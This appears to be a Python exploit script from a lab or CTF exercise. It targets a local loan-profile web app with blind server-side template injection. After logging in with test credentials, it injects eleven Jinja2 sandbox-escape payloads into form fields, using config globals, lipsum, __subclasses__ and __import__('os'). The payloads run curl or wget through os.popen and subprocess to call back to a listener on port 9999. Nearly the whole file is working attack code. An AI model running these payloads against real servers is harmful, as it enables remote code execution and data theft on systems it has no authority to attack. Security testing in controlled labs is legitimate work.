import requests
import time
import re

# Configuration
base_url = "http://127.0.0.1:32813"
target_url = f"{base_url}/profile"
login_url = f"{base_url}/login"

# Create session and authenticate
session = requests.Session()
print("[*] Attempting to authenticate...")

try:
    # Get login page
    login_page = session.get(login_url)
    print(f"[+] Login page status: {login_page.status_code}")
    
    # Perform login
    login_data = {
        'username': 'test',
        'password': 'test'
    }
    
    login_response = session.post(login_url, data=login_data, allow_redirects=True)
    print(f"[+] Login status: {login_response.status_code}")
    print(f"[+] Session cookies: {dict(session.cookies)}")
    
    if 'profile' in login_response.url or login_response.status_code == 200:
        print("[+] Authentication successful!")
    else:
        print("[-] Login may have failed, but continuing...")
        
except Exception as e:
    print(f"[-] Login error: {e}")

# Define SSTI payloads to test blind exfiltration
# Each payload attempts a different method of making outbound requests or executing code

print("\n[*] Preparing SSTI payloads for blind exfiltration testing...")

# Main payloads from the test requirements
payloads_to_test = [
    # Test 1: urllib.request.urlopen
    ("test1", "{{ urllib.request.urlopen('http://localhost:9999/test1') }}"),
    
    # Test 2: Alternative urllib access via config
    ("test2", "{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://localhost:9999/test2') }}"),
    
    # Test 3: os.popen with curl
    ("test3", "{{ os.popen('curl http://localhost:9999/test3') }}"),
    
    # Test 4: subprocess.check_output with curl
    ("test4", "{{ subprocess.check_output(['curl','http://localhost:9999/test4']) }}"),
]

# Additional payloads using different methods and contexts
additional_payloads = [
    # Using lipsum global with os.popen
    ("test5", "{{ lipsum.__globals__['os'].popen('curl http://localhost:9999/test5').read() }}"),
    
    # Using request object with os access
    ("test6", "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('curl http://localhost:9999/test6').read() }}"),
    
    # Using config directly
    ("test7", "{{ config.__class__.__init__.__globals__['os'].popen(\"curl http://localhost:9999/test7\").read() }}"),
    
    # Direct __import__ of os
    ("test8", "{{ __import__('os').popen('curl http://localhost:9999/test8').read() }}"),
    
    # Alternative class traversal
    ("test9", "{{ ''.__class__.__mro__[2].__subclasses__()[257]('curl http://localhost:9999/test9', shell=True, stdout=-1).communicate() }}"),
    
    # Using wget instead of curl
    ("test10", "{{ __import__('os').popen('wget -qO- http://localhost:9999/test10').read() }}"),
    
    # Using config with direct access
    ("test11", "{{ config.__init__.__globals__.__builtins__.__import__('os').popen('curl http://localhost:9999/test11').read() }}"),
]

all_payloads = payloads_to_test + additional_payloads

print(f"[*] Testing {len(all_payloads)} payloads...\n")

# Track execution evidence
execution_evidence = []

for test_id, payload in all_payloads:
    print(f"\n--- Testing: {test_id} ---")
    print(f"[*] Payload: {payload[:80]}...")
    
    # Prepare POST data with all required fields
    # Inject payload into different fields to test various injection points
    post_data_loan_amount = {
        'name': 'Test',
        'lastname': 'User', 
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    post_data_name = {
        'name': payload,
        'lastname': 'User', 
        'email': 'test@example.com',
        'loan_amount': '100000',
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    post_data_email = {
        'name': 'Test',
        'lastname': 'User', 
        'email': payload,
        'loan_amount': '100000',
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    try:
        # Test in loan_amount field (primary injection point)
        print("[*] Injecting into loan_amount field...")
        response = session.post(target_url, data=post_data_loan_amount)
        print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
        
        # Check for error traces, evidence of execution in response
        text_lower = response.text.lower()
        
        # Look for Python/Jinja2 error patterns
        error_patterns = [
            r'jinja2?\.[^<\s]+',
            r'template[^<\s]+error',
            r'undefined\s+variable',
            r'attribute[^<\s]+error',
            r'module\s+not\s+found',
            r'os\.popen',
            r'subprocess\.',
            r'urllib\.',
            r'curl',
            r'wget'
        ]
        
        found_errors = []
        for pattern in error_patterns:
            matches = re.findall(pattern, text_lower, re.IGNORECASE)
            if matches:
                found_errors.extend(matches)
        
        if found_errors:
            print(f"[!] Interesting patterns found in response: {found_errors}")
            execution_evidence.append({
                'test_id': test_id,
                'field': 'loan_amount',
                'patterns': found_errors,
                'response_sample': response.text[:300]
            })
        
        # Check if payload is reflected
        if payload in response.text:
            print(f"[!] WARNING: Payload reflected in response - injection point may not be vulnerable")
        elif '{{' in response.text or '{%' in response.text:
            print(f"[!] Template syntax appears in output - possible filtering")
        
        # Wait a moment
        time.sleep(0.5)
        
        # Test in name field as alternative
        print("[*] Also testing in name field...")
        response2 = session.post(target_url, data=post_data_name)
        print(f"[+] Status: {response2.status_code} | Length: {len(response2.content)}B")
        
        time.sleep(0.5)
        
    except Exception as e:
        print(f"[-] Error sending payload: {e}")

# Wait for potential callbacks
print("\n[*] Waiting for potential callbacks...")
time.sleep(2)

# Report results
print("\n" + "="*70)
print("FINAL RESULTS - Blind SSTI Exfiltration Test")
print("="*70)

if execution_evidence:
    print(f"[+] Found {len(execution_evidence)} cases with interesting patterns:")
    for evidence in execution_evidence:
        print(f"\n  Test: {evidence['test_id']}")
        print(f"  Field: {evidence['field']}")
        print(f"  Patterns: {evidence['patterns']}")
        print(f"  Sample: {evidence['response_sample'][:150]}...")
else:
    print("[-] No obvious execution evidence found in responses")

print(f"\n[*] Tested {len(all_payloads)} payloads across multiple fields")
print("\n[!] NOTE: A callback server on port 9999 would be needed to confirm")
print("     actual outbound HTTP requests from successful payloads.")

# Based on available context, if the profile page shows loan data,
# successful SSTI would either:
# 1. Show the result of the execution in the loan_amount field
# 2. Cause an error that reveals the object graph
# 3. Make a callback to our server (which we can't test here due to threading limits)

print("\n[!] To properly test blind exfiltration, a callback server must run")
print("    simultaneously with the payload delivery. The threading restriction")
print("    in this environment prevents running both in the same script.")
